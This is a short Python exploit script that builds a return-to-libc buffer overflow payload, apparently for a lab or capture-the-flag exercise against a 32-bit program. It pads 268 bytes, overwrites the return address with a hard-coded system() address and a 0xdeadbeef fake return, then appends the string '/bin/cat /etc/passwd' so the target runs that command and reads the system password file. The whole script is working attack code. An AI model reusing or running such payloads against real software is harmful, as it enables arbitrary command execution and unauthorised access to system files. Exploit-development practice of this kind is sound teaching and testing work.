#!/usr/bin/env python3

import sys

oflow = b'A' * 268

string = b"/bin/cat /etc/passwd\0"

#string_addr = 0xffffd838
string_addr = 0xffffd7f8

frames = [
        #system (0xf7e46db0), fake ret (0xdeadbeef), 1 arg
        [ b'\xb0\x6d\xe4\xf7', b'\xef\xbe\xad\xde', string_addr.to_bytes(4, byteorder='little') ]
        ]

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
